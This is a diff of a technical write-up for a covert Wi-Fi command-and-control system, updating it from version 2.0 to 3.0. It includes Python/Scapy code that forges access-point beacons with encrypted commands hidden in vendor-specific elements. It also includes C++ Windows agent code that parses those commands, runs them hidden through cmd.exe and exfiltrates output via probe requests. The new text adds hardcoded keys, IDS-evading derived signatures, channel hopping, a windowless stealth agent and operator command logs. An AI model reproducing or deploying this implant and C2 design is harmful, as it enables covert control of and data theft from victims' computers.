@@ -1,4 +1,4 @@
-# Covert Wi-Fi C2 Using Vendor Specific Elements (VSE)
+# Covert Wi-Fi C2 v3.0 — Vendor Specific Elements (Next-Gen)
 
 This write-up documents a high-bandwidth covert command channel that uses **802.11 Vendor Specific Elements (Tag 221)** as a bidirectional C2 transport:
 
@@ -8,673 +8,621 @@ This write-up documents a high-bandwidth covert command channel that uses **802.
 - **Server (Python / Kali, monitor mode):**  
   Injects beacon frames with **hidden payloads inside VSE tags**, appearing as a legitimate access point.
 - **Agent (Windows / WLAN API):**  
-  Scans for nearby Wi-Fi networks, parses raw Information Elements (IEs) from beacons, extracts VSE payloads, reassembles commands, executes them, and **exfiltrates responses via Probe Requests**.
+  Scans for nearby Wi-Fi networks, parses raw Information Elements (IEs), extracts VSE payloads, reassembles commands, executes them, and **exfiltrates responses via Probe Requests**.
 
 No association to any access point is required. A powered-on machine with a Wi-Fi card is sufficient.
 
 ---
 
-## 1. High-Level Concept
+## 1. What's New in v3.0
 
-**Goal:**  
-Use **802.11 beacon frames with Vendor Specific Elements** as an *air-gap-style* bidirectional C2 channel with high downstream bandwidth:
+Version 3.0 is a full-stack rewrite with 7 major improvements:
 
-- The Python script on Kali crafts fake beacons that look like legitimate APs (e.g., `xfinitywifi`, `linksys`) but contain hidden command payloads inside **Tag 221 (VSE)**.
-- **VSE Stacking**: Multiple Tag 221 elements are packed into a single beacon frame, achieving **~1.2 KB per packet** (vs. ~30 bytes with SSID-only).
-- The agent parses raw IE data from `WlanGetNetworkBssList`, extracts and reassembles command fragments, decrypts them, and executes.
-- Responses are **exfiltrated upstream** via Probe Request SSIDs back to the server.
-
-This creates a **wireless, bidirectional C2 path** that:
-
-- Does **not** rely on TCP/IP connectivity from victim to attacker.
-- Requires only **physical RF proximity** (scalable via antennas).
-- Is **invisible to standard Wi-Fi UIs** (VSE tags are not displayed to users).
-- Looks like legitimate AP traffic on the air.
+| # | Feature | Description |
+|:--|:--------|:------------|
+| 1 | **AES-256-CTR** | Replaces RC4. Per-message random 12-byte nonce via BCrypt (agent) and PyCryptodome (server). |
+| 2 | **ACK / Retransmit** | Agent ACKs received commands; server ACKs received responses. Both stop retransmitting on ACK. |
+| 3 | **Stealth by Default** | No console window, `CreateProcess` with `CREATE_NO_WINDOW`. Use `-debug` for console output during testing. |
+| 4 | **OUI Rotation** | Session OUI derived from PSK via SHA-256 — no hardcoded magic bytes for IDS to match. |
+| 5 | **Job Queue** | Server-side FIFO queue. Stack multiple commands; each auto-advances after ACK. |
+| 6 | **Channel Hopping** | Shared PRNG schedule derived from PSK + wall-clock time. Both sides compute the same channel independently. |
 
 ---
 
-## 2. Evolution: Version 1.0 vs 2.0
+## 2. Evolution: v1.0 → v2.0 → v3.0
 
-| Feature | **Version 1.0 (SSID)** | **Version 2.0 (VSE)** |
-|:---|:---|:---|
-| **Transport Vector** | SSID Field (Network Name) | Vendor Specific Elements (Tag 221) |
-| **Visibility** | **Visible** as weird network names (e.g., `RX:AGT01:DATA...`) | **Invisible** to standard UI. Mimics legitimate networks |
-| **Downstream Speed** | ~30 Bytes/packet (32-byte SSID limit) | ~1.2 KB/packet (5 VSE tags × 255 bytes) |
-| **Upstream (Exfil)** | Not implemented | Via Probe Request SSIDs (~21 bytes/packet) |
-| **Reliability** | Low (interleaved scanning, ~90% drop rate) | High (blocking exfil mode) |
-| **Targeting** | Broadcast only | Multi-Agent support (unicast + broadcast) |
-| **Stealth** | None (visible SSIDs) | Jitter, vendor masquerading, stable identity |
-| **Encryption** | Base64 only | RC4 + Base64 |
+| Feature | **v1.0 (SSID)** | **v2.0 (VSE)** | **v3.0 (Next-Gen)** |
+|:---|:---|:---|:---|
+| **Transport** | SSID Field | VSE Tag 221 | VSE Tag 221 |
+| **Encryption** | Base64 only | RC4 + Base64 | **AES-256-CTR** + Base64 |
+| **Key Management** | None | Hardcoded 16B key | 32B PSK, per-message nonce |
+| **Downstream BW** | ~30 B/pkt | ~1.2 KB/pkt | ~1.2 KB/pkt |
+| **Upstream BW** | None | ~21 B/pkt | ~20 B/pkt |
+| **Reliability** | Low | Medium (loop) | **High** (ACK + retransmit + queue) |
+| **Signatures** | Visible SSIDs | Hardcoded OUI `00:40:96` | **Derived OUI** (no static fingerprint) |
+| **Channel** | Fixed | Fixed (ch 6) | **Hopping** (1, 6, 11 — PRNG schedule) |
+| **Agent Liveness** | Unknown | Unknown | Discovered on first ACK/response |
+| **Stealth** | None | Jitter + vendor spoof | Jitter + vendor spoof + **stealth by default (no console, CreateProcess)** |
+| **Multi-Command** | No | One at a time | **FIFO job queue** |
 
 ---
 
 ## 3. Over-The-Air Protocol & Frame Format
 
-### 3.1 Downstream Protocol (Server → Agent)
+### 3.1 v3.0 Header Structure (12 bytes)
 
-Commands are encrypted (RC4), encoded (Base64), fragmented, and wrapped in a custom binary header inside **Tag 221 (VSE)**.
-
-#### VSE Header Structure (10 bytes)
+Both downstream (VSE) and upstream (Probe SSID) use the same header layout:
 
 ```text
 Offset  Size  Field         Description
 ------  ----  -----         -----------
-0       3     OUI           C2 Identifier: 00:40:96
-3       1     Agent ID      Target agent (0 = broadcast, 1-255 = specific)
-4       2     Job ID        Unique job identifier (big-endian)
-6       2     Sequence      Fragment number, 1-based (big-endian)
-8       2     Total         Total fragments in job (big-endian)
-10      N     Data          Base64-encoded encrypted command fragment
+0       3     Session OUI   Derived from SHA-256(PSK || "WIFIAIR_OUI_V3")[:3]
+3       1     Msg Type      0x01=CMD, 0x02=ACK, 0x04=RESPONSE
+4       1     Agent ID      Target/source agent (0 = broadcast)
+5       2     Job ID        Unique job identifier (big-endian)
+7       2     Sequence      Fragment number, 1-based (big-endian)
+9       2     Total         Total fragments in job (big-endian)
+11      1     Flags         Bit 1: ENCRYPTED
+12      N     Data          Payload fragment (base64 encoded)
 ```
 
-#### Beacon Frame Anatomy
+### 3.2 Downstream Protocol (Server → Agent)
+
+Commands are encrypted, encoded, fragmented, and wrapped in VSE tags:
 
 ```text
 [ 802.11 Beacon Frame ]
    │
    ├── [ Fixed Params ] (Timestamp, Interval, Capabilities)
-   │
    ├── [ Tag 0: SSID ] = "linksys" (Stable session identity)
-   │
    ├── [ Tag 1: Rates ] = Standard supported rates
+   ├── [ Tag 3: DS Parameter Set ] = Current hop channel
    │
-   ├── [ Tag 3: DS Parameter Set ] = Channel 6
-   │
-   ├── [ Tag 221: VSE #1 ] ◄─── PAYLOAD CHUNK 1
-   │     │
-   │     └── [ OUI: 00:40:96 ] [ Agent: 01 ] [ Job: A5F1 ] [ Seq: 1 ] [ Total: 5 ] [ Data... ]
-   │
-   ├── [ Tag 221: VSE #2 ] ◄─── PAYLOAD CHUNK 2
-   │
-   ├── [ Tag 221: VSE #3 ] ◄─── PAYLOAD CHUNK 3
-   │
-   ├── [ Tag 221: VSE #4 ] ◄─── PAYLOAD CHUNK 4
-   │
-   └── [ Tag 221: VSE #5 ] ◄─── PAYLOAD CHUNK 5
+   ├── [ Tag 221: VSE #1 ] ◄── PAYLOAD CHUNK 1
+   │     └── [ OUI: derived ] [ Type: CMD ] [ Agent ] [ Job ] [ Seq ] [ Total ] [ Flags ] [ Data... ]
+   ├── [ Tag 221: VSE #2 ] ◄── PAYLOAD CHUNK 2
+   ├── [ Tag 221: VSE #3 ] ◄── PAYLOAD CHUNK 3
+   ├── [ Tag 221: VSE #4 ] ◄── PAYLOAD CHUNK 4
+   └── [ Tag 221: VSE #5 ] ◄── PAYLOAD CHUNK 5
 ```
 
-**VSE Stacking:** Up to 5 Tag 221 elements are injected per beacon, each carrying up to 239 bytes of payload data, achieving **~1.2 KB downstream per beacon frame**.
+**Capacity:** 5 tags × 243 bytes = **~1.2 KB per beacon** (255 byte VSE - 12 byte header = 243 data).
 
-### 3.2 Upstream Protocol (Agent → Server)
+### 3.3 Upstream Protocol (Agent → Server)
 
-The agent exfiltrates command output via **Probe Request SSIDs**. Since Windows cannot inject custom VSE tags, data is encoded into the SSID field.
-
-#### Exfil Header Structure (10 bytes)
-
-```text
-Offset  Size  Field         Description
-------  ----  -----         -----------
-0       3     OUI           Exfil Identifier: 00:40:97
-3       1     Agent ID      Responding agent's ID
-4       2     Job ID        Job being responded to (big-endian)
-6       2     Sequence      Fragment number, 1-based (big-endian)
-8       2     Total         Total fragments in response (big-endian)
-10      21    Data          Base64-encoded encrypted output fragment
-```
-
-#### Probe Request Anatomy
+Responses follow the same pipeline in reverse, sent via Probe Request SSIDs:
 
 ```text
 [ 802.11 Probe Request ]
-   │
-   └── [ Tag 0: SSID ] (Max 32 Bytes)
-         │
-         ├── [ OUI (3 Bytes) ]      : 00:40:97 (Exfil Signature)
-         ├── [ Agent ID (1 Byte) ]  : 0x01
-         ├── [ Job ID (2 Bytes) ]   : 0xA5F1
-         ├── [ Seq (2 Bytes) ]      : 0x0001
-         ├── [ Total (2 Bytes) ]    : 0x000A
-         └── [ Data (21 Bytes) ]    : Encrypted Output Fragment
+   └── [ Tag 0: SSID ] (32 Bytes max)
+         ├── [ Session OUI (3B) ]
+         ├── [ Msg Type (1B) ] : RESPONSE (0x04)
+         ├── [ Agent ID (1B) ]
+         ├── [ Job ID (2B) ]
+         ├── [ Seq (2B) ]
+         ├── [ Total (2B) ]
+         ├── [ Flags (1B) ]
+         └── [ Data (20B) ] : Encrypted fragment
 ```
 
-**Bandwidth Constraint:** SSID is limited to 32 bytes. After 10 bytes of header, only **21 bytes of payload per packet** are available for upstream exfiltration.
+**Bandwidth:** SSID is limited to 32 bytes. After 12 bytes of header, **20 bytes of payload per packet** are available for upstream exfiltration.
 
-### 3.3 Encryption Layer
+### 3.4 Encryption Layer: AES-256-CTR
 
-Both directions use **RC4 stream cipher** with a pre-shared 16-byte key:
+Both directions use **AES-256-CTR** with a 32-byte pre-shared key:
 
 ```python
-# Server (Python)
-RC4_KEY = bytes([0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 
-                 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01])
+# Server (Python / PyCryptodome)
+PSK = bytes([
+    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
+    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
+    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
+    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
+])
 ```
 
 ```cpp
-// Agent (C++)
-const BYTE RC4_KEY[] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
-                         0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
+// Agent (C++ / Windows BCrypt)
+static const BYTE PSK[32] = {
+    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
+    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
+    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
+    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
+};
 ```
+
+**Per-message nonce:** Every encrypt operation generates a cryptographically random 12-byte nonce. The encrypted payload format is:
+
+```text
+[ Nonce (12 bytes) ] [ AES-256-CTR Ciphertext (N bytes) ]
+```
+
+**Why AES-256-CTR over RC4:**
+- RC4 has known keystream biases and is vulnerable to related-key attacks
+- RC4 with a static key produces identical ciphertext for identical plaintext (fingerprinting risk)
+- AES-256-CTR with a random nonce guarantees unique ciphertext for every message
+- BCrypt provides hardware-accelerated AES on modern Windows
 
 **Processing Pipeline:**
 
-- **Downstream:** `Command → RC4 Encrypt → Base64 Encode → Fragment → VSE Tags`
-- **Upstream:** `Output → RC4 Encrypt → Base64 Encode → Fragment → Probe SSIDs`
+```text
+Downstream: Command → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → VSE Tags
+Upstream:   Output  → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → Probe SSIDs
+```
+
+### 3.5 OUI Derivation (No Static Signatures)
+
+The session OUI is deterministically derived from the PSK:
+
+```python
+SESSION_OUI = SHA256(PSK + b"WIFIAIR_OUI_V3")[:3]
+```
+
+Both server and agent compute the same OUI independently. There are no hardcoded magic bytes that an IDS could fingerprint. Changing the PSK changes the OUI.
 
 ---
 
-## 4. Sender (Kali / Python / Scapy) Walkthrough
+## 4. ACK / Retransmit Protocol
 
-### 4.1 Session Identity Generation
+### 4.1 Downstream ACK Flow
 
-At startup, the server generates a **stable session identity** that mimics a real access point:
-
-```python
-def generate_session_identity():
-    vendor_prefixes = [
-        ([0x00, 0x1A, 0x2B], "Cisco"),
-        ([0x00, 0x1E, 0x58], "D-Link"),
-        ([0x00, 0x24, 0xB2], "Netgear"),
-        ([0x00, 0x26, 0x5A], "TP-Link"),
-        ([0x00, 0x1C, 0x10], "Linksys"),
-    ]
-    ssid_options = ["xfinitywifi", "linksys", "NETGEAR", "ATT-WIFI-5G", "HOME-WIFI"]
-    
-    prefix, vendor = random.choice(vendor_prefixes)
-    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
-    bssid = ':'.join(f'{b:02x}' for b in prefix + suffix)
-    ssid = random.choice(ssid_options)
-    
-    return bssid, ssid, vendor
+```text
+Server                              Agent
+  │                                   │
+  │──── CMD beacon (loop) ──────────> │
+  │                                   │ reassemble...
+  │                                   │ ACK probe
+  │ <── ACK probe ──────────────────  │
+  │                                   │
+  │ stop broadcast, advance queue     │ execute command
 ```
 
-This creates a consistent AP identity (BSSID + SSID) for the entire session, appearing as a single legitimate access point.
+When the agent successfully reassembles a command, it immediately sends an **ACK probe** (MsgType=0x02) containing the Job ID. The server stops broadcasting that job and advances to the next job in the queue.
 
-### 4.2 Command Preparation & Fragmentation
+**Note:** ACK probes are only sent when exfil mode is enabled (`-exfil`). In **receive-only mode** (no `-exfil` flag), the agent produces zero upstream traffic — no ACKs, no probes of any kind. The server simply keeps broadcasting until the operator manually runs `stop`.
 
-```python
-def prepare_job(command, agent_id=0):
-    # Encrypt command
-    data = command.encode('utf-8')
-    encrypted = rc4(RC4_KEY, data)
-    payload = base64.b64encode(encrypted)
-    
-    # Fragment into 239-byte chunks (VSE can hold up to 255, minus header)
-    chunk_size = 239
-    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
-    
-    # Generate random job ID
-    job_id = struct.pack('>H', random.randint(1, 65535))
-    total = len(chunks)
-    
-    # Build each chunk with header
-    prepared = []
-    for seq, chunk_data in enumerate(chunks, 1):
-        header = C2_OUI + bytes([agent_id]) + job_id + \
-                 struct.pack('>H', seq) + struct.pack('>H', total)
-        prepared.append(header + chunk_data)
-    
-    return job_id, prepared, agent_id
+### 4.2 Upstream ACK Flow
+
+```text
+Agent                               Server
+  │                                   │
+  │──── RESPONSE probes (pass 1) ──>  │
+  │                                   │ reassemble...
+  │  ┌─ quick scan ─┐                │ ACK beacon (15x, 1.5s)
+  │  │ check for ACK │<── ACK ─────── │
+  │  └──── found! ───┘                │
+  │                                   │
+  │ stop exfil, back to scan mode     │ display output
 ```
 
-### 4.3 Beacon Frame Crafting
+When the server successfully reassembles a response, it sends an **ACK beacon** (MsgType=0x02) repeated 15 times over 1.5 seconds. Between each retransmit pass, the agent performs a **quick scan** that checks incoming beacons for this ACK. If found, the agent stops exfiltrating immediately and returns to scan mode — even if the `-duration` timeout has not expired.
 
-```python
-def create_beacon(chunks_batch):
-    # 802.11 Management Frame (Beacon)
-    dot11 = Dot11(type=0, subtype=8, 
-                  addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
-                  addr2=SESSION_BSSID,         # Our stable BSSID
-                  addr3=SESSION_BSSID)
-    
-    beacon = Dot11Beacon(cap='ESS+privacy')
-    essid = Dot11Elt(ID='SSID', info=SESSION_SSID, len=len(SESSION_SSID))
-    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
-    dsset = Dot11Elt(ID='DSset', info=b'\x06')  # Channel 6
-    
-    packet = RadioTap()/dot11/beacon/essid/rates/dsset
-    
-    # Stack multiple VSE tags (up to 5 per beacon)
-    for chunk in chunks_batch:
-        packet = packet / Dot11Elt(ID=221, info=chunk)
-    
-    return packet
-```
+This inter-pass scan also picks up any **new commands** the server is broadcasting, so the agent can queue them for execution right after the current exfil completes.
 
-### 4.4 Jittered Broadcast Loop
+**Encrypt-once guarantee:** The response payload is encrypted once before the retransmit loop begins. Every retransmit pass sends the exact same encrypted chunks. This ensures the server can mix-and-match fragments from different passes and still decrypt correctly.
 
-```python
-BEACON_JITTER_MIN = 0.08   # 80ms
-BEACON_JITTER_MAX = 0.12   # 120ms (typical for real APs ~100ms)
+### 4.3 Stale Job Pruning
 
-def broadcast_loop():
-    while broadcast_active and current_job:
-        job_id, chunks, agent_id = current_job
-        
-        # Send chunks in batches of 5 (VSE stacking)
-        for i in range(0, len(chunks), TAGS_PER_BEACON):
-            batch = chunks[i:i+TAGS_PER_BEACON]
-            sendp(create_beacon(batch), iface=INTERFACE, verbose=0)
-            
-            # Jittered delay mimics real AP beacon intervals
-            time.sleep(random.uniform(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
-        
-        # Cycle jitter between full broadcasts
-        time.sleep(random.uniform(CYCLE_JITTER_MIN, CYCLE_JITTER_MAX))
-```
-
-### 4.5 Response Sniffing
-
-The server captures Probe Request frames and extracts exfiltrated data:
-
-```python
-def handle_probe(pkt):
-    if not pkt.haslayer(Dot11ProbeReq):
-        return
-    
-    ssid = pkt[Dot11Elt].info
-    if not ssid or len(ssid) < 10 or ssid[:3] != EXFIL_OUI:
-        return  # Not our exfil packet
-    
-    # Parse header
-    agent_id = ssid[3]
-    job_id = (ssid[4] << 8) | ssid[5]
-    seq = (ssid[6] << 8) | ssid[7]
-    total = (ssid[8] << 8) | ssid[9]
-    data = ssid[10:]
-    
-    # Store fragment and reassemble when complete
-    # ... (buffering and reassembly logic)
-    
-    if all_fragments_received:
-        full_b64 = ''.join(all_parts)
-        encrypted = base64.b64decode(full_b64)
-        decrypted = rc4(RC4_KEY, encrypted)
-        print(f"[+] Agent {agent_id} Response:\n{decrypted.decode()}")
-```
+Both sides prune stale state:
+- **Agent:** Active jobs older than 2 minutes are discarded. Completed jobs set is cleared at 1000 entries.
+- **Server:** Incomplete response buffers older than 5 minutes are discarded with a warning.
 
 ---
 
-## 5. Agent (Windows / WLAN API) Walkthrough
+## 5. Channel Hopping
 
-### 5.1 WLAN Enumeration & Raw IE Access
+### 5.1 Shared Schedule
 
-The agent uses Windows WLAN API to scan and access **raw Information Elements**:
+Both sides compute the current channel from the PSK and wall-clock time:
 
-```cpp
-void ScanLoop() {
-    HANDLE hClient = NULL;
-    DWORD dwVer = 0;
-    WlanOpenHandle(2, NULL, &dwVer, &hClient);
-    
-    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-    WlanEnumInterfaces(hClient, NULL, &pIfList);
-    GUID* pGuid = &pIfList->InterfaceInfo[0].InterfaceGuid;
-    
-    while (true) {
-        // Trigger scan
-        WlanScan(hClient, pGuid, NULL, NULL, NULL);
-        WaitForSingleObject(g_hScanComplete, 500);
-        
-        // Get BSS list with raw IEs
-        PWLAN_BSS_LIST pBssList = NULL;
-        if (WlanGetNetworkBssList(hClient, pGuid, NULL, 
-                                   dot11_BSS_type_any, FALSE, 
-                                   NULL, &pBssList) == ERROR_SUCCESS) {
-            
-            for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
-                PWLAN_BSS_ENTRY pEntry = &pBssList->wlanBssEntries[i];
-                
-                // Parse raw IE data for VSE tags
-                if (pEntry->ulIeSize > 0) {
-                    ParseVSE(hClient, pGuid, 
-                             (PBYTE)pEntry + pEntry->ulIeOffset, 
-                             pEntry->ulIeSize);
-                }
-            }
-            WlanFreeMemory(pBssList);
-        }
-    }
-}
+```python
+CHANNELS     = [1, 6, 11]   # Non-overlapping 2.4GHz
+HOP_INTERVAL = 10           # seconds per dwell
+SEED = int(SHA256(PSK + "WIFIAIR_CHANNEL_HOP")[:4])
+
+def get_current_channel():
+    slot = int(time.time()) // HOP_INTERVAL
+    h = ((SEED + slot) * 2654435761) & 0xFFFFFFFF  # Knuth hash
+    return CHANNELS[h % 3]
 ```
 
-### 5.2 VSE Parsing & Command Extraction
+The server actively hops its monitor-mode interface. The agent computes the schedule for awareness but relies on Windows' standard scanning behavior (which sweeps all channels).
 
-```cpp
-void ParseVSE(HANDLE hClient, GUID* pGuid, PBYTE pRawData, DWORD dwSize) {
-    DWORD offset = 0;
-    
-    while (offset < dwSize) {
-        BYTE ieID = pRawData[offset];
-        BYTE ieLen = pRawData[offset + 1];
-        PBYTE ieData = &pRawData[offset + 2];
-        
-        // Check for our VSE tag (ID 221, OUI 00:40:96)
-        if (ieID == 221 && ieLen >= 10 && memcmp(ieData, C2_OUI, 3) == 0) {
-            
-            // Extract header fields
-            BYTE targetAgent = ieData[3];
-            unsigned short jobId = (ieData[4] << 8) | ieData[5];
-            unsigned short seq = (ieData[6] << 8) | ieData[7];
-            unsigned short total = (ieData[8] << 8) | ieData[9];
-            
-            // Check targeting (0 = broadcast, else must match our ID)
-            if (targetAgent != 0 && targetAgent != g_AgentId) {
-                offset += (2 + ieLen);
-                continue;  // Not for us
-            }
-            
-            // Skip if job already completed
-            if (completed_jobs.count(jobId)) {
-                offset += (2 + ieLen);
-                continue;
-            }
-            
-            // Extract data chunk
-            std::string chunk((char*)(ieData + 10), ieLen - 10);
-            
-            // Store in job buffer
-            JobBuffer& buf = active_jobs[jobId];
-            buf.total_chunks = total;
-            buf.parts[seq] = chunk;
-            
-            // Check if job is complete
-            if (buf.parts.size() == total) {
-                // Reassemble all fragments
-                std::string full_b64;
-                for (unsigned short i = 1; i <= total; i++)
-                    full_b64 += buf.parts[i];
-                
-                // Decrypt and execute
-                std::vector<BYTE> encrypted = Base64Decode(full_b64);
-                RC4(RC4_KEY, RC4_KEY_LEN, encrypted.data(), encrypted.size());
-                std::string cmd(encrypted.begin(), encrypted.end());
-                
-                std::cout << "[+] EXECUTE: " << cmd << std::endl;
-                std::string output = ExecCommand(cmd);
-                
-                // Mark for exfiltration
-                if (g_ExfilEnabled) {
-                    g_CurrentJobId = jobId;
-                    g_CurrentOutput = output;
-                    g_HasDataToExfil = true;
-                }
-                
-                completed_jobs.insert(jobId);
-                active_jobs.erase(jobId);
-            }
-        }
-        offset += (2 + ieLen);
-    }
-}
+### 5.2 Operational Notes
+
+- **Clock sync:** Both sides need roughly synchronized clocks (NTP). A 10-second dwell provides tolerance.
+- **Disable with:** `server.py -nohop` or `server.py -channel 6` for fixed operation.
+- **Dual-interface:** For simultaneous beacon injection and probe sniffing on different channels, use two Wi-Fi adapters.
+
+---
+
+## 6. Agent Tracking
+
+The server discovers agents when it receives an **ACK probe** or **response data** from them (requires `-exfil` on the agent). The `agents` command shows per-agent status:
+
+```text
+C2> agents
+[*] Known Agents:
+    Agent   1 | ALIVE | seen 5s ago  | jobs 3
+    Agent   2 | STALE | seen 120s ago | jobs 1
+    Agent   3 | LOST  | seen 400s ago | jobs 0
 ```
 
-### 5.3 Response Exfiltration via Probe Requests
+| Status | Condition |
+|:-------|:----------|
+| **ALIVE** | Seen within 60 seconds |
+| **STALE** | Seen within 300 seconds |
+| **LOST** | Not seen for 300+ seconds |
 
-```cpp
-void SendExfilSequence(HANDLE hClient, GUID* pGuid) {
-    // Encrypt output
-    std::vector<BYTE> toEncrypt(g_CurrentOutput.begin(), g_CurrentOutput.end());
-    RC4(RC4_KEY, RC4_KEY_LEN, toEncrypt.data(), toEncrypt.size());
-    std::string b64 = Base64Encode(toEncrypt);
-    
-    const size_t CHUNK_SIZE = 21;  // Max payload after 10-byte header
-    unsigned short total = (b64.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
-    
-    for (int i = 0; i < total; i++) {
-        unsigned short seq = i + 1;
-        std::string chunk = b64.substr(i * CHUNK_SIZE, CHUNK_SIZE);
-        
-        // Build SSID with exfil header
-        DOT11_SSID ssid = { 0 };
-        ssid.ucSSID[0] = EXFIL_OUI[0];  // 00
-        ssid.ucSSID[1] = EXFIL_OUI[1];  // 40
-        ssid.ucSSID[2] = EXFIL_OUI[2];  // 97
-        ssid.ucSSID[3] = g_AgentId;
-        ssid.ucSSID[4] = (g_CurrentJobId >> 8) & 0xFF;
-        ssid.ucSSID[5] = g_CurrentJobId & 0xFF;
-        ssid.ucSSID[6] = (seq >> 8) & 0xFF;
-        ssid.ucSSID[7] = seq & 0xFF;
-        ssid.ucSSID[8] = (total >> 8) & 0xFF;
-        ssid.ucSSID[9] = total & 0xFF;
-        memcpy(&ssid.ucSSID[10], chunk.c_str(), chunk.size());
-        ssid.uSSIDLength = 10 + chunk.size();
-        
-        // Send as Probe Request (WlanScan with specific SSID)
-        DWORD result = WlanScan(hClient, pGuid, &ssid, NULL, NULL);
-        
-        if (result == ERROR_SUCCESS)
-            std::cout << "." << std::flush;
-        else
-            std::cout << "!" << std::flush;  // Driver busy, will retry
-        
-        // Jittered delay between packets
-        Sleep(Jitter(g_ExfilJitterMin, g_ExfilJitterMax));
-    }
-}
+**Note:** In receive-only mode (no `-exfil`), agents are invisible to the server — they execute commands silently with zero upstream traffic.
+
+---
+
+## 7. Job Queue
+
+### 7.1 Server-Side FIFO
+
+The server maintains a FIFO queue of prepared jobs. When the operator sends multiple commands, they are queued and dispatched sequentially:
+
+```text
+C2> send 1 whoami
+[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
+[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)
+
+C2> send 1 ipconfig /all
+[+] Queued Job 0xc3d4 -> Agent 1 (2 chunks, queue depth: 1)
+
+C2> send 1 netstat -an
+[+] Queued Job 0xe5f6 -> Agent 1 (1 chunks, queue depth: 2)
+
+C2> queue
+[*] Job queue (2 pending):
+    1. Job 0xc3d4 -> Agent 1 (2 chunks)
+    2. Job 0xe5f6 -> Agent 1 (1 chunks)
+[*] Currently broadcasting: 0xa1b2 -> Agent 1
 ```
 
-### 5.4 Blocking Exfil Mode
+Jobs advance automatically when the agent ACKs the current job (requires `-exfil` on the agent), or manually with `skip`.
 
-When a command is executed, the agent enters **Blocking Mode** to ensure reliable exfiltration:
+### 7.2 Queue Management Commands
 
-```cpp
-if (g_ExfilEnabled && g_HasDataToExfil) {
-    DWORD startTime = GetTickCount();
-    
-    // Dedicate all resources to exfil for the configured duration
-    while (GetTickCount() - startTime < g_ExfilDurationMs) {
-        SendExfilSequence(hClient, pGuid);
-    }
-    
-    std::cout << "[*] Exfil Timeout. Returning to Scan Mode." << std::endl;
-    g_HasDataToExfil = false;
-}
+| Command | Action |
+|:--------|:-------|
+| `stop` | Pause current broadcast (queue untouched) |
+| `skip` | Stop current broadcast, immediately start next job in queue |
+| `remove 2` | Remove job #2 from the queue (by position) |
+| `remove 0xc3d4` | Remove a specific job by hex ID |
+| `flush` | Clear entire queue and stop broadcasting |
+
+```text
+C2> queue
+[*] Job queue (2 pending):
+    1. Job 0xc3d4 -> Agent 1 (2 chunks)
+    2. Job 0xe5f6 -> Agent 1 (1 chunks)
+[*] Currently broadcasting: 0xa1b2 -> Agent 1
+
+C2> remove 0xe5f6
+[+] Removed Job 0xe5f6 -> Agent 1
+
+C2> skip
+[>] Broadcasting Job 0xc3d4 -> Agent 1 (2 chunks)
 ```
 
-This stops scanning temporarily and continuously broadcasts the response until the duration expires, giving the server many opportunities to capture all fragments.
+### 7.3 Agent-Side Exfil Queue
 
-### 5.5 Command Execution (Hidden)
+The agent queues response data for sequential exfiltration. If a new command arrives while the agent is exfiltrating a previous response (detected during inter-pass scanning), the new command is queued for execution once the current exfil completes.
 
-```cpp
-std::string ExecCommand(const std::string& cmd) {
-    std::string result;
-    char buffer[4096];
-    std::string fullCmd = "cmd.exe /c " + cmd + " 2>&1";
-    
-    FILE* pipe = _popen(fullCmd.c_str(), "r");
-    if (!pipe) return "ERROR: Failed to execute";
-    
-    while (fgets(buffer, sizeof(buffer), pipe))
-        result += buffer;
-    
-    _pclose(pipe);
-    if (result.empty()) result = "[No output]";
-    return result;
-}
+---
+
+## 8. Stealth by Default
+
+The agent runs in full stealth mode by default — no console window, no visible output, no user interaction.
+
+**Default behavior (no flags needed):**
+- Console window hidden via `FreeConsole()` at startup
+- All commands executed via `CreateProcess` with `CREATE_NO_WINDOW` and redirected pipes
+- Zero console output
+
+**Debug mode (`-debug` flag):**
+- Console window remains visible
+- Full logging output for testing and development
+
+```powershell
+# Normal operation (stealth, invisible)
+agent.exe -agent 1
+
+# Testing (visible console with full debug output)
+agent.exe -agent 1 -debug
+agent.exe -agent 1 -exfil -duration 60 -debug
 ```
 
 ---
 
-## 6. Usage / Workflow
+## 9. Operating Modes
 
-### 6.1 Requirements
+The agent supports two distinct modes based on whether `-exfil` is passed:
+
+### 9.1 Receive-Only Mode (default)
+
+```powershell
+agent.exe -agent 1
+```
+
+- **Zero upstream traffic** — no probes of any kind are transmitted
+- No ACK, no exfiltration
+- Agent silently receives and executes commands
+- Ideal for long-range one-way scenarios (directional antenna, parking lot ops)
+- The operator assumes the command was delivered and relies on the target reaching the internet or other side-channel for confirmation
+
+### 9.2 Bidirectional Mode
+
+```powershell
+agent.exe -agent 1 -exfil -duration 60
+```
+
+- Full upstream: ACK probes, response exfiltration
+- Server auto-advances job queue on ACK
+- Agent stops exfil early when server ACKs the response
+- Requires physical proximity for upstream (probe request range ~50-100m)
+
+---
+
+## 10. Usage / Workflow
+
+### 10.1 Requirements
 
 **Attacker / Operator:**
 - Kali Linux with:
